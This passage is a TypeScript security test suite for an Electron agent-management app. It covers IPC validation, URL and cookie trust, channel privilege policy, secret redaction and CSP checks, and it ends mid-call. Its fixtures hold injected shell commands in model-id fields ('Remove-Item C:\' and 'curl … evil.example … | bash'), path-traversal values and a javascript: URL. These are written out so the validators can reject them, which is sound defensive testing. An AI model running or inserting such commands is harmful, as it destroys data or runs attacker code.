/** Pure Goal 3/5 checks for IPC validation, URL trust, CSP and notification policy. */

import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { assertIpcPayload } from '../src/main/ipcValidation';
import { runDiagnosticCommand } from '../src/main/diagnostics/RuntimeDiagnostics';
import { sessionExitNotice } from '../src/main/notificationPolicy';
import { isSafeExternalUrl, isTrustedRendererUrl } from '../src/main/security';
import { assertAllowedDashboardUrl, extractDashboardUrl } from '../src/main/dashboard/dashboardUrl';
import {
  SESSION_COOKIE_TTL_SECONDS,
  cookieBelongsToOrigin,
  toPersistentCookie,
} from '../src/main/dashboard/cookiePersistence';
import {
  MAX_IPC_ERROR_CHARS,
  MAX_WIRE_TEXT_CHARS,
  redactArgs,
  redactEnvForLog,
  redactForWire,
  redactSensitiveText,
  redactedErrorMessage,
  redactedWireMessage,
  toIpcError,
} from '../src/main/errors';
import {
  CHANNEL_POLICY,
  REMOTE_COMMAND_CHANNELS,
  SHELL_CHANNELS,
  assertChannelPolicy,
  channelPolicyViolations,
  remoteChannels,
} from '../src/main/ipcPolicy';
import { INVOKE_CHANNELS, type InvokeChannel } from '../src/shared/ipc';
import { resolveLaunchCommand } from '../src/shared/runtimes';
import { parseWorkspaceBundle } from '../src/shared/workspaceBundle';
import type { SessionMeta } from '../src/shared/types';

let passed = 0;
let failed = 0;

function check(label: string, condition: boolean, detail?: unknown): void {
  if (condition) {
    passed += 1;
    console.log(`  ok  ${label}`);
  } else {
    failed += 1;
    console.error(`FAIL  ${label}`, detail ?? '');
  }
}

function rejects(channel: InvokeChannel, payload: unknown): boolean {
  try {
    assertIpcPayload(channel, payload);
    return false;
  } catch {
    return true;
  }
}

const valid: Record<InvokeChannel, unknown> = {
  'config:get': undefined,
  'config:health': undefined,
  'config:save': { settings: { theme: 'dark' } },
  'workspaceBundle:pickImport': undefined,
  'workspaceBundle:authorizeMappings': {
    mappings: { repositories: {}, agentHomes: {} },
  },
  'workspaceBundle:preview': {
    selectionId: '12345678-1234-1234-1234-123456789abc',
    mappingAuthorizationId: 'abcdefab-1234-1234-1234-123456789abc',
  },
  'workspaceBundle:apply': {
    sessionId: '12345678-1234-1234-1234-123456789abc',
    token: 'a'.repeat(64),
  },
  'workspaceBundle:export': { includeMemory: false, includePhotos: false },
  'photo:import': { bytesBase64: 'YQ==', mime: 'image/png' },
  'category:create': { name: 'Project', kind: 'plain' },
  'category:update': { id: 'category', name: 'Project', photo: null },
  'category:delete': { id: 'category' },
  'category:reorder': { orderedIds: ['category-a', 'category-b'] },
  'agent:create': {
    categoryId: 'category',
    name: 'Agent',
    runtime: 'codex',
    permissionMode: 'bypass',
    codexModel: 'gpt-5.6-sol',
    codexReasoningEffort: 'xhigh',
  },
  'agent:update': {
    id: 'agent',
    name: 'Agent',
    runtime: 'claude',
    permissionMode: 'accept-edits',
  },
  'agent:delete': { id: 'agent' },
  'agent:move': { agentId: 'agent', categoryId: 'category', index: 0 },
  'agent:setDefaultRepository': { agentId: 'agent', repositoryId: 'repository' },
  'agent:openDashboard': { agentId: 'agent' },
  'agentTemplate:create': { sourceAgentId: 'agent', name: 'Reusable writer' },
  'agentTemplate:delete': { id: 'template' },
  'agentTemplate:spawn': {
    templateId: 'template',
    categoryId: 'category',
    name: 'Writer',
    defaultRepositoryId: 'repository',
  },
  'repository:import': { path: 'C:\\repos\\project', name: 'Project' },
  'repository:overview': { repositoryId: 'repository' },
  'repository:pullRequests': { repositoryId: 'repository' },
  'repository:pullRequestChecks': { repositoryId: 'repository', pullRequestNumber: 42 },
  'harness:status': undefined,
  'harness:diagnose': undefined,
  'harness:setKey': { runtime: 'grok', apiKey: 'contract-fixture-key' },
  'harness:clearKey': { runtime: 'grok' },
  'harness:setServiceKey': { name: 'ELEVENLABS_API_KEY', value: 'contract-fixture', scope: 'all' },
  'harness:clearServiceKey': { name: 'ELEVENLABS_API_KEY' },
  'harness:login': { agentId: 'agent', runtime: 'claude' },
  'repository:commitDiff': {
    repositoryId: 'repository',
    commitSha: '0123456789abcdef0123456789abcdef01234567',
  },
  'workspace:describe': { agentId: 'agent', sessionId: 'session' },
  'workspace:removeBinding': { workspaceBindingId: 'binding' },
  'clipboard:readText': undefined,
  'clipboard:writeText': { text: 'copied terminal selection' },
  'pty:create': {
    agentId: 'agent',
    task: 'Work',
    dispatchId: 'dispatch',
    runTaskId: 'task',
    repositoryId: 'repository',
    workspaceBindingId: 'binding',
  },
  'pty:write': { sessionId: 'session', dataBase64: 'YQ==' },
  'pty:resize': { sessionId: 'session', cols: 120, rows: 32 },
  'pty:kill': { sessionId: 'session' },
  'pty:attach': { sessionId: 'session' },
  'pty:list': undefined,
  'overview:get': undefined,
  'pty:cancelTasks': {},
  'runtime:diagnose': {},
  'run:get': undefined,
  'run:create': {
    name: 'Run',
    goal: 'Goal',
    repositoryId: 'repository',
    participants: [{ agentId: 'agent', role: 'orchestrator', runtime: 'codex' }],
  },
  'run:delete': { runId: 'run' },
  'run:start': { runId: 'run', commandId: 'cmd-start' },
  'run:cancel': { runId: 'run', commandId: 'cmd-cancel' },
  'run:pauseTeam': { runId: 'run', teamId: 'team', commandId: 'cmd-pause' },
  'run:resumeTeam': { runId: 'run', teamId: 'team' },
  'run:getSummary': { runId: 'run' },
  'run:events': { sinceSeq: 0, limit: 200 },
  'run:approvalDiff': { runId: 'run' },
  'run:publicationPreview': { runId: 'run' },
  'run:publish': {
    runId: 'run',
    expectedHeadSha: '0123456789abcdef0123456789abcdef01234567',
    expectedHeadBranch: 'ade/run-12345678-feature',
    commandId: 'cmd-publish',
  },
  'pty:activitySnapshot': { sessionId: 'session' },
  'runTask:activity': { taskId: 'task' },
  'runApproval:resolve': { approvalId: 'approval', decision: 'approve', commandId: 'cmd-approve' },
  'runTask:create': { runId: 'run', participantId: 'participant', prompt: 'Do it' },
  'runTask:submit': { agentId: 'agent', repositoryId: 'repository', prompt: 'Do it', commandId: 'cmd-submit' },
  'runTask:fail': { taskId: 'task', error: 'failed' },
  'runArtifact:create': { runId: 'run', kind: 'result', content: 'done' },
  'git:status': { agentId: 'agent', sessionId: 'session' },
  'git:diff': { agentId: 'agent', sessionId: 'session', path: 'src/index.ts' },
  'fs:tree': { agentId: 'agent', sessionId: 'session', path: '' },
  'fs:read': { agentId: 'agent', sessionId: 'session', path: 'README.md' },
  'fs:agentFiles': { agentId: 'agent', sessionId: 'session' },
  'fs:pathInfo': { agentId: 'agent', sessionId: 'session', path: 'README.md' },
  'fs:reveal': { agentId: 'agent', sessionId: 'session', path: 'README.md' },
  'fs:openPath': { agentId: 'agent', sessionId: 'session', path: 'README.md' },
  'fs:rename': { agentId: 'agent', sessionId: 'session', path: 'notes.md', newName: 'notes-2.md' },
  'fs:delete': { agentId: 'agent', sessionId: 'session', path: 'notes.md' },
  'dialog:pickFolder': undefined,
  'wsl:list': undefined,
};

for (const channel of INVOKE_CHANNELS) {
  let accepted = true;
  try {
    assertIpcPayload(channel, valid[channel]);
  } catch (error) {
    accepted = false;
    console.error(error);
  }
  check(`${channel} accepts its contract payload`, accepted);
}

check('config writes cannot replace catalog data', rejects('config:save', { categories: [] }));
check('config save accepts an inspector side without changing the theme',
  !rejects('config:save', { settings: { inspectorSide: 'left' } }));
check('config save rejects an unknown inspector side',
  rejects('config:save', { settings: { inspectorSide: 'top' } }));
check('unknown fields are rejected', rejects('pty:kill', { sessionId: 's', extra: true }));
check('workspace bundle preview accepts only a main-issued selection id',
  rejects('workspaceBundle:preview', {
    path: '/tmp/renderer-controlled.json',
    mappingAuthorizationId: 'abcdefab-1234-1234-1234-123456789abc',
  })
  && rejects('workspaceBundle:preview', {
    selectionId: '../renderer-controlled',
    mappingAuthorizationId: 'abcdefab-1234-1234-1234-123456789abc',
  }));
check('workspace bundle preview rejects renderer-supplied destination mappings',
  rejects('workspaceBundle:preview', {
    selectionId: '12345678-1234-1234-1234-123456789abc',
    mappings: { repositories: {}, agentHomes: {} },
  }));
check('persisted task activity requires one exact task id',
  rejects('runTask:activity', {})
  && rejects('runTask:activity', { taskId: 'task', extra: true }));
check('malformed base64 is rejected', rejects('pty:write', { sessionId: 's', dataBase64: '%' }));
check('oversized terminal dimensions are rejected', rejects('pty:resize', { sessionId: 's', cols: 5000, rows: 20 }));
check('empty run rosters are rejected', rejects('run:create', { name: 'Run', participants: [] }));
check('invalid run concurrency is rejected', rejects('run:create', {
  name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
  budget: { maxConcurrentTasks: 5 },
}));
check('unknown participant harnesses are rejected', rejects('run:create', {
  name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator', runtime: 'openclaw' }],
}));
check('workspace preparation accepts only the documented reset mode',
  !rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    workspacePrepare: 'reset-to-base',
  })
  && rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    workspacePrepare: 'force',
  })
  && rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    workspacePrepare: true,
  }));
check('task time budgets are bounded whole minutes or null',
  !rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    budget: { maxTaskMinutes: 45 },
  })
  && !rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    budget: { maxTaskMinutes: null },
  })
  && rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    budget: { maxTaskMinutes: 0 },
  })
  && rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    budget: { maxTaskMinutes: 1_441 },
  })
  && rejects('run:create', {
    name: 'Run', participants: [{ agentId: 'agent', role: 'orchestrator' }],
    budget: { maxTaskMinutes: 2.5 },
  }));
check('single-task submission accepts only agent, repository, prompt, name and commandId',
  !rejects('runTask:submit', { agentId: 'agent', repositoryId: 'repository', prompt: 'Do it', name: 'Quick fix' })
  && rejects('runTask:submit', { agentId: 'agent', prompt: 'Do it' })
  && rejects('runTask:submit', { agentId: 'agent', repositoryId: 'repository', prompt: '' })
  && rejects('runTask:submit', { agentId: 'agent', repositoryId: 'repository', prompt: 'x'.repeat(8_001) })
  && rejects('runTask:submit', {
    agentId: 'agent', repositoryId: 'repository', prompt: 'Do it', runId: 'run',
  })
  && rejects('runTask:submit', {
    agentId: 'agent', repositoryId: 'repository', prompt: 'Do it', workspaceBindingId: 'binding',
  })
  && rejects('runTask:submit', {
    agentId: 'agent', repositoryId: 'repository', prompt: 'Do it', commandId: 'x'.repeat(129),
  }));
check('unknown approval decisions are rejected', rejects('runApproval:resolve', {
  approvalId: 'approval', decision: 'maybe',
}));
check('oversized command ids are rejected', rejects('run:start', {
  runId: 'run', commandId: 'x'.repeat(129),
}));
check('null journal cursors are rejected', rejects('run:events', { sinceSeq: null }));
check('oversized journal pages are rejected', rejects('run:events', { limit: 501 }));
check('team pause requires a team id', rejects('run:pauseTeam', { runId: 'run' }));
check('unknown runtimes are rejected', rejects('agent:create', {
  categoryId: 'c', name: 'a', runtime: 'unknown', permissionMode: 'default',
}));
check('publication rejects non-ADE target branches', rejects('run:publish', {
  runId: 'run',
  expectedHeadSha: '0123456789abcdef0123456789abcdef01234567',
  expectedHeadBranch: 'main',
}));
check('publication rejects malformed or uppercase Git object ids',
  rejects('run:publish', {
    runId: 'run',
    expectedHeadSha: 'not-a-sha',
    expectedHeadBranch: 'ade/run-safe-feature',
  })
  && rejects('run:publish', {
    runId: 'run',
    expectedHeadSha: 'ABCDEF6789abcdef0123456789abcdef01234567',
    expectedHeadBranch: 'ade/run-safe-feature',
  }));
check('publication rejects traversal-like or lock refs',
  rejects('run:publish', {
    runId: 'run',
    expectedHeadSha: '0123456789abcdef0123456789abcdef01234567',
    expectedHeadBranch: 'ade/run-safe/../main',
  })
  && rejects('run:publish', {
    runId: 'run',
    expectedHeadSha: '0123456789abcdef0123456789abcdef01234567',
    expectedHeadBranch: 'ade/run-safe.lock',
  }));
check('Codex model ids reject shell metacharacters', rejects('agent:create', {
  categoryId: 'c', name: 'a', runtime: 'codex', permissionMode: 'bypass',
  codexModel: 'gpt-5.6-sol; Remove-Item C:\\', codexReasoningEffort: 'xhigh',
}));
check('unknown Codex reasoning levels are rejected', rejects('agent:create', {
  categoryId: 'c', name: 'a', runtime: 'codex', permissionMode: 'bypass',
  codexModel: 'gpt-5.6-sol', codexReasoningEffort: 'extreme',
}));
check('Codex model settings cannot leak onto another runtime', rejects('agent:update', {
  id: 'agent', name: 'a', runtime: 'claude', permissionMode: 'default',
  codexModel: 'gpt-5.6-sol',
}));
check('Grok model ids reject shell metacharacters', rejects('agent:create', {
  categoryId: 'c', name: 'a', runtime: 'grok', permissionMode: 'bypass',
  grokModel: 'grok-4.6; Remove-Item C:\\', grokReasoningEffort: 'high',
}));
check('unknown Grok reasoning levels are rejected', rejects('agent:create', {
  categoryId: 'c', name: 'a', runtime: 'grok', permissionMode: 'bypass',
  grokModel: 'grok-4.6', grokReasoningEffort: 'ultra',
}));
check('Grok model settings cannot leak onto another runtime', rejects('agent:update', {
  id: 'agent', name: 'a', runtime: 'codex', permissionMode: 'default',
  grokModel: 'grok-4.6',
}));
check('Grok login is a documented harness login command',
  !rejects('harness:login', { agentId: 'agent', runtime: 'grok' }));
check('workspace traversal is rejected before filesystem handlers',
  rejects('fs:read', { agentId: 'agent', path: '../outside.txt' }));
check('deletion traversal is rejected before filesystem handlers',
  rejects('fs:delete', { agentId: 'agent', path: 'C:\\Windows\\notepad.exe' }));
check('reveal rejects absolute paths',
  rejects('fs:reveal', { agentId: 'agent', path: '/etc/passwd' }));
check('rename rejects path separators in the new name',
  rejects('fs:rename', { agentId: 'agent', path: 'a.md', newName: '../b.md' }));
check('rename rejects dot names',
  rejects('fs:rename', { agentId: 'agent', path: 'a.md', newName: '..' }));
check('category order must be an id array',
  rejects('category:reorder', { orderedIds: 'category' }));
check('agent moves need an integer index',
  rejects('agent:move', { agentId: 'agent', categoryId: 'category', index: 1.5 }));
check('agent moves reject negative indexes',
  rejects('agent:move', { agentId: 'agent', categoryId: 'category', index: -1 }));
check('repository selectors reject malformed non-string values',
  rejects('pty:create', { agentId: 'agent', repositoryId: 42 }));
check('worktree removal requires a binding id',
  rejects('workspace:removeBinding', {}));
check('clipboard writes reject non-string payloads',
  rejects('clipboard:writeText', { text: 42 }));
check('clipboard reads reject stray payloads',
  rejects('clipboard:readText', { extra: true }));
check('workspace selectors reject unknown fields',
  rejects('workspace:describe', { agentId: 'agent', repositoryId: 'repo' }));

const packaged = 'file:///C:/ade/out/renderer/index.html';
check('exact packaged renderer URL is trusted', isTrustedRendererUrl(packaged, undefined, packaged));
check('packaged renderer query/hash remain trusted', isTrustedRendererUrl(`${packaged}?x=1#top`, undefined, packaged));
check('another local file is not trusted', !isTrustedRendererUrl('file:///C:/tmp/index.html', undefined, packaged));
check('exact dev renderer origin and path are trusted', isTrustedRendererUrl(
  'http://localhost:5173/?x=1', 'http://localhost:5173/', packaged,
));
check('lookalike dev origin is rejected', !isTrustedRendererUrl(
  'http://localhost:5173.evil.test/', 'http://localhost:5173/', packaged,
));
check('ordinary HTTPS links may open externally', isSafeExternalUrl('https://example.com/docs'));
check('credentialed and custom-protocol links are blocked',
  !isSafeExternalUrl('https://user:pass@example.com/') && !isSafeExternalUrl('file:///C:/secret'));

function dashboardRejects(value: string): boolean {
  try {
    assertAllowedDashboardUrl(value);
    return false;
  } catch {
    return true;
  }
}
check('dashboard command output yields its first http(s) URL',
  extractDashboardUrl(
    'Gateway ready.\nControl UI: https://numbercruncher.tailfc0b86.ts.net:8443/?token=abc (press q)\n',
  ) === 'https://numbercruncher.tailfc0b86.ts.net:8443/?token=abc'
    && extractDashboardUrl('no url here at all') === null);
check('dashboards allow https anywhere and http only on the local machine',
  assertAllowedDashboardUrl('https://host.tail.ts.net:8443/?token=x').origin
      === 'https://host.tail.ts.net:8443'
    && assertAllowedDashboardUrl('http://127.0.0.1:18789/?token=x').hostname === '127.0.0.1'
    && assertAllowedDashboardUrl('http://localhost:3000/').hostname === 'localhost');
check('remote http, credentials and non-web schemes never become dashboards',
  dashboardRejects('http://numbercruncher.local:8443/')
    && dashboardRejects('https://user:pass@host.example/')
    && dashboardRejects('file:///C:/dashboard.html')
    && dashboardRejects('javascript:alert(1)')
    && dashboardRejects('not a url'));
check('dashboard target values are validated on agent:update',
  rejects('agent:update', {
    id: 'agent', name: 'Agent', runtime: 'shell', permissionMode: 'default',
    dashboardTarget: 'popup',
  }));

const hostOnlySession = toPersistentCookie({
  name: 'sid', value: 'abc', domain: 'host.tail.ts.net', path: '/', secure: true,
  httpOnly: true, session: true, sameSite: 'lax',
}, 1_000);
const domainSession = toPersistentCookie({
  name: 'sid', value: 'abc', domain: '.example.com', path: '/app', session: true,
}, 1_000);
check('dashboard session cookies gain a bounded expiry on persistence',
  hostOnlySession?.expirationDate === 1_000 + SESSION_COOKIE_TTL_SECONDS
    && hostOnlySession.url === 'https://host.tail.ts.net/'
    && hostOnlySession.httpOnly === true
    && hostOnlySession.sameSite === 'lax');
check('host-only cookies stay host-only; domain cookies keep their domain',
  hostOnlySession !== null && !('domain' in hostOnlySession)
    && domainSession?.domain === '.example.com'
    && domainSession.url === 'http://example.com/app');
check('persistent or malformed cookies are left untouched',
  toPersistentCookie({ name: 'sid', value: 'abc', domain: 'x.test', session: false }, 1_000) === null
    && toPersistentCookie({ name: 'sid', value: 'abc', session: true }, 1_000) === null);

/* ------------------------------------------ Thema 6: dashboard cookie scope */

const dashboardOrigin = 'https://hermes.tail.ts.net';
check('cookie persistence covers host-only and domain cookies of the dashboard origin',
  cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: 'hermes.tail.ts.net', secure: true }, dashboardOrigin)
    && cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: '.tail.ts.net' }, dashboardOrigin)
    && cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: '.ts.net' }, dashboardOrigin));
check('cookie persistence refuses foreign origins reached through a login redirect',
  !cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: 'accounts.idp.example' }, dashboardOrigin)
    && !cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: '.idp.example' }, dashboardOrigin)
    && !cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: 'ts.net' }, dashboardOrigin)
    && !cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: 'evil-hermes.tail.ts.net' }, dashboardOrigin));
check('secure cookies persist only for https or loopback dashboards',
  !cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: 'intranet.local', secure: true }, 'http://intranet.local')
    && cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: 'localhost', secure: true }, 'http://localhost:3000')
    && !cookieBelongsToOrigin({ name: 'sid', value: 'a' }, dashboardOrigin)
    && !cookieBelongsToOrigin({ name: 'sid', value: 'a', domain: 'x.test' }, 'not a url'));

/* ---------------------------------------- Thema 6: channel privilege policy */

check('every invoke channel carries a privilege policy',
  INVOKE_CHANNELS.every((channel) => CHANNEL_POLICY[channel] !== undefined)
    && Object.keys(CHANNEL_POLICY).length === INVOKE_CHANNELS.length);
check('the channel policy satisfies its invariants', channelPolicyViolations().length === 0,
  channelPolicyViolations());
check('the shell effect is confined to the dashboard command channel',
  INVOKE_CHANNELS.filter((channel) => CHANNEL_POLICY[channel].effect === 'shell').join(',')
    === 'agent:openDashboard'
    && SHELL_CHANNELS.length === 1);
check('channels that store dashboard commands are marked as arming the shell boundary',
  (['agent:create', 'agent:update', 'agentTemplate:create', 'agentTemplate:spawn', 'workspaceBundle:apply'] as const)
    .every((channel) => CHANNEL_POLICY[channel].armsShell === true));
const sharedChannels = INVOKE_CHANNELS.filter((channel) => CHANNEL_POLICY[channel].surface === 'shared');
check('host-API shared channels are read-only unless allowlisted as remote commands',
  sharedChannels
    .filter((channel) => !REMOTE_COMMAND_CHANNELS.includes(channel))
    .every((channel) => CHANNEL_POLICY[channel].effect === 'read'
      && CHANNEL_POLICY[channel].remote?.scope === 'read'
      && CHANNEL_POLICY[channel].remote?.proof === 'bearer'));
check('the remote command allowlist is exactly run create/start/cancel plus single-task submission',
  [...REMOTE_COMMAND_CHANNELS].sort().join(',') === 'run:cancel,run:create,run:start,runTask:submit'
    && REMOTE_COMMAND_CHANNELS.every((channel) => sharedChannels.includes(channel)));
check('single-task submission is a shared launch that never exposes the desktop task-create or PTY channels',
  CHANNEL_POLICY['runTask:submit'].effect === 'launch'
    && CHANNEL_POLICY['runTask:submit'].surface === 'shared'
    && CHANNEL_POLICY['runTask:create'].surface === 'desktop'
    && CHANNEL_POLICY['pty:create'].surface === 'desktop'
    && CHANNEL_POLICY['pty:write'].surface === 'desktop'
    && CHANNEL_POLICY['pty:attach'].surface === 'desktop');
check('remote commands demand write scope, idempotency key, device signature and audit',
  REMOTE_COMMAND_CHANNELS.every((channel) => {
    const policy = CHANNEL_POLICY[channel];
    return policy.remote?.scope === 'runs:write'
      && policy.remote.idempotency === 'required'
      && policy.remote.proof === 'device-signature'
      && policy.audit;
  }));
check('no shared channel reaches the PTY, filesystem, config mutation, host or shell boundaries',
  sharedChannels.every((channel) => !channel.startsWith('pty:')
    && !channel.startsWith('fs:')
    && !channel.startsWith('dialog:')
    && !channel.startsWith('clipboard:')
    && channel !== 'config:save'
    && channel !== 'run:publish'
    && !['host', 'shell'].includes(CHANNEL_POLICY[channel].effect)));
check('desktop-only channels never carry a remote requirement',
  INVOKE_CHANNELS.filter((channel) => CHANNEL_POLICY[channel].surface === 'desktop')
    .every((channel) => CHANNEL_POLICY[channel].remote === undefined));
check('remoteChannels() lists exactly the shared surface',
  remoteChannels().sort().join(',') === [...sharedChannels].sort().join(','));
check('process-launching channels are classified as launch and audited',
  ([
    'pty:create', 'pty:kill', 'harness:login', 'run:start', 'run:cancel', 'run:publish', 'runApproval:resolve',
    'runTask:submit',
  ] as const)
    .every((channel) => CHANNEL_POLICY[channel].effect === 'launch' && CHANNEL_POLICY[channel].audit));
check('high-frequency terminal input is launch-classified but not audited per call',
  CHANNEL_POLICY['pty:write'].effect === 'launch' && !CHANNEL_POLICY['pty:write'].audit
    && CHANNEL_POLICY['pty:resize'].effect === 'launch' && !CHANNEL_POLICY['pty:resize'].audit);
check('host-reaching channels are classified as host',
  (['clipboard:readText', 'clipboard:writeText', 'fs:reveal', 'fs:openPath', 'fs:delete', 'dialog:pickFolder'] as const)
    .every((channel) => CHANNEL_POLICY[channel].effect === 'host'));
check('policy violations are reported, not swallowed',
  channelPolicyViolations({
    ...CHANNEL_POLICY,
    'fs:read': { effect: 'shell', surface: 'desktop', audit: false },
    'run:getSummary': { effect: 'mutate', surface: 'shared', audit: false },
  }).length === 3);
const remoteWrite = { scope: 'runs:write', idempotency: 'required', proof: 'device-signature' } as const;
check('a shared mutation outside the remote command allowlist is a violation',
  channelPolicyViolations({
    ...CHANNEL_POLICY,
    'run:publish': { effect: 'launch', surface: 'shared', audit: true, remote: remoteWrite },
  }).some((violation) => violation.startsWith('run:publish: shared surface requires the read effect')));
check('a remote command that accepts the bearer token alone is a violation',
  channelPolicyViolations({
    ...CHANNEL_POLICY,
    'run:create': { effect: 'mutate', surface: 'shared', audit: true, remote: { ...remoteWrite, proof: 'bearer' } },
  }).some((violation) => violation.includes('device signature')));
check('a remote command without idempotency, write scope or audit is a violation',
  channelPolicyViolations({
    ...CHANNEL_POLICY,
    'run:start': {
      effect: 'launch', surface: 'shared', audit: false,
      remote: { scope: 'read', idempotency: 'none', proof: 'device-signature' },
    },
  }).filter((violation) => violation.startsWith('run:start:')).length === 3);
check('shared host or shell effects and desktop remote requirements are violations',
  channelPolicyViolations({
    ...CHANNEL_POLICY,
    'fs:reveal': { effect: 'host', surface: 'shared', audit: true, remote: remoteWrite },
    'config:health': { effect: 'read', surface: 'desktop', audit: false, remote: { scope: 'read', idempotency: 'none', proof: 'bearer' } },
  }).filter((violation) => violation.startsWith('fs:reveal:') || violation.startsWith('config:health:')).length >= 2);
check('registering a misclassified channel fails closed',
  (() => {
    try {
      assertChannelPolicy('config:get');
      return true;
    } catch {
      return false;
    }
  })());

/* ------------------------------------------- Thema 6: redaction funnel */

const leakyStderr = 'remote: https://oauth2:ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789@github.com/o/r.git '
  + 'ANTHROPIC_API_KEY=sk-ant-api03-SECRETSECRETSECRETSECRET OPENAI_API_KEY="sk-proj-AAAAAAAAAAAAAAAAAAAA" '
  + 'XAI_API_KEY=xai-BBBBBBBBBBBBBBBBBBBBBBBB GEMINI=AIzaSyCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC '
  + 'Authorization: Bearer eyJhbGciOi.payload.sig \u001b[31mred\u001b[0m';
const funnelled = redactSensitiveText(leakyStderr);
check('the redaction funnel strips URL credentials, vendor keys and env assignments',
  !funnelled.includes('ghp_AbCd')
    && !funnelled.includes('sk-ant-api03')
    && !funnelled.includes('sk-proj-AAAA')
    && !funnelled.includes('xai-BBBB')
    && !funnelled.includes('AIzaSyCCCC')
    && !funnelled.includes('eyJhbGciOi')
    && funnelled.includes('ANTHROPIC_API_KEY=[credential]')
    && funnelled.includes('OPENAI_API_KEY=[credential]')
    && !funnelled.includes('\u001b'),
  funnelled);
check('redaction leaves paths, SHAs and ordinary identifiers intact',
  redactSensitiveText('C:\\Users\\me\\repo at 0123456789abcdef0123456789abcdef01234567 run-abc task=t1 ADE_TASK_DIR=/tmp/x')
    === 'C:\\Users\\me\\repo at 0123456789abcdef0123456789abcdef01234567 run-abc task=t1 ADE_TASK_DIR=/tmp/x');
check('redaction is idempotent', redactSensitiveText(funnelled) === funnelled);
check('argv redaction masks secrets element-wise',
  JSON.stringify(redactArgs(['--exec', 'claude', '--api-key', 'sk-ant-api03-SECRETSECRETSECRETSECRET', 'TOKEN=abc']))
    === JSON.stringify(['--exec', 'claude', '--api-key', '[credential]', 'TOKEN=[credential]']));
check('env log redaction hides secret-named values and keeps the rest readable',
  JSON.stringify(redactEnvForLog({ ANTHROPIC_API_KEY: 'sk-ant-x', TERM: 'xterm-256color', ADE_TASK_DIR: '/tmp/t' }))
    === JSON.stringify({ ANTHROPIC_API_KEY: '[credential]', TERM: 'xterm-256color', ADE_TASK_DIR: '/tmp/t' }));
const ipcError = toIpcError(new Error(`ade: backend command exited with code 128: ${leakyStderr}`));
check('IPC errors are rebuilt through the funnel and bounded',
  ipcError instanceof Error
    && ipcError.message.startsWith('ade: backend command exited with code 128')
    && !ipcError.message.includes('ghp_AbCd')
    && !ipcError.message.includes('sk-ant-api03')
    && toIpcError(new Error('x'.repeat(5_000))).message.length === MAX_IPC_ERROR_CHARS);
check('non-Error rejections still become bounded, redacted Error replies',
  toIpcError({ stderr: 'fatal: https://u:p@host/x' }).message === 'fatal: https://[credentials]@host/x'
    && toIpcError('token=abc').message === 'token=[credential]'
    && redactedErrorMessage(42) === '42');

/* -------------------------------- Goal 7: wire redaction for the host API */

const wireLeak = 'clone failed for C:\\Users\\me\\repos\\secret-project into /home/me/.ade/worktrees/run-1 '
  + 'and \\\\wsl$\\Ubuntu\\home\\me\\x; token=ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789 ADE_TASK_DIR=/tmp/task';
const wired = redactForWire(wireLeak);
check('wire redaction removes Windows, POSIX and UNC host paths and credentials',
  !wired.includes('C:\\Users')
    && !wired.includes('/home/me')
    && !wired.includes('wsl$')
    && !wired.includes('ghp_AbCd')
    && wired.includes('[path]')
    && wired.includes('token=[credential]'),
  wired);
check('wire redaction keeps identifiers, URLs without credentials and relative names readable',
  redactForWire('run-abc task=t1 https://github.com/o/r.git src/main/index.ts exited with code 128')
    === 'run-abc task=t1 https://github.com/o/r.git src/main/index.ts exited with code 128');
check('wire redaction is bounded and idempotent',
  redactForWire('x'.repeat(5_000)).length === MAX_WIRE_TEXT_CHARS
    && redactForWire(wired) === wired);
check('wire error messages are redacted Error texts, never raw objects',
  redactedWireMessage(new Error('ade: failed at /var/lib/ade/x with sk-ant-api03-SECRETSECRETSECRETSECRET'))
    === 'ade: failed at [path] with [credential]'
    && redactedWireMessage({ stack: 'at C:\\Users\\me\\x.ts:1' }).length > 0
    && !redactedWireMessage({ stack: 'at C:\\Users\\me\\x.ts:1' }).includes('C:\\Users'));

const rendererHtml = readFileSync(join(process.cwd(), 'src/renderer/index.html'), 'utf8');
check('renderer declares a default-deny CSP', rendererHtml.includes("default-src 'none'"));
check('CSP forbids unsafe script evaluation', !rendererHtml.includes("script-src 'self' 'unsafe-eval'"));
check('CSP explicitly limits frames and objects',
  rendererHtml.includes("frame-src 'none'") && rendererHtml.includes("object-src 'none'"));
const mainEntry = readFileSync(join(process.cwd(), 'src/main/index.ts'), 'utf8');
check('renderer sandbox is enabled', mainEntry.includes('sandbox: true') && !mainEntry.includes('sandbox: false'));
check('photo scheme no longer bypasses CSP',
  !readFileSync(join(process.cwd(), 'src/main/photos.ts'), 'utf8').includes('bypassCSP'));

// An Ollama model id is substituted into `ollama run ${model}`, and PtyManager
// types that line into a login shell. Before this was closed, the value was
// accepted as free text at every boundary — including from an imported
// workspace bundle, which deliberately refuses to carry customCommand.
const INJECTING_MODEL = 'llama3; curl -s http://evil.example/p | bash';
const agentUpdate = (ollamaModel: string): unknown => ({
  id: 'agent-1', name: 'Runner', runtime: 'ollama', permissionMode: 'default', ollamaModel,
});

// The negative and positive case share one fixture, so a payload that is
// rejected for an unrelated reason (a missing required field) cannot be
// mistaken for the model id being refused.
check('an injecting ollamaModel is refused at the IPC boundary',
  rejects('agent:update', agentUpdate(INJECTING_MODEL)));

check('a plain Ollama model id still passes the IPC boundary',
